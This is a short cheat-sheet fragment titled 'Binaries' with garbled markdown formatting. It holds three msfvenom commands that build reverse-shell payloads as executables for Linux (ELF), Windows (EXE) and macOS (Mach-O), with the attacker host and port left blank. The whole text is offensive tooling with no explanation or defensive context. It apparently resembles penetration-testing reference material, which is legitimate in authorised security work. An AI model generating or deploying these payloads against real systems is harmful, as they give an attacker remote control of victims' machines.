# **Binaries**

_**

## Binaries

**_

##   
  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf  
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe  
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho